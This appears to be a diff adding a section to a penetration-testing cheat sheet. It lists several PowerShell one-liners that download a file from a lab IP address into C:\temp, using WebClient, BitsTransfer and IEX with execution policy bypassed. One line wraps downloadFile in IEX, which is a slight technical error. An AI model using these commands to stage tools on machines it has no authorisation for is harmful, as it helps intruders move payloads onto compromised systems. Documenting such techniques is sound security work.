@@ -56,3 +56,27 @@ USING POWERSHELL -
     echo '$webclient.DownloadFile($url, $file)' >> wget.ps1
 
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+    
+
+USING CMD - 
+------------------------------------------------------------------------------------------------------------------
+
+
+#### 
+**Web Content Download**
+	
+    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://192.168.1.143/1.txt','c:\temp\1.txt')
+
+**Web Content Download**
+
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://192.168.1.143/1.txt' -Destination 'C:\temp\1.txt'"
+
+**Web Content Download**
+	
+    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('http://192.168.1.143:80/1.txt','c:\temp\1.txt')"
+
+**Web Content Download**
+	
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://192.168.1.143/1.txt','C:\temp\1.txt')"
+
+
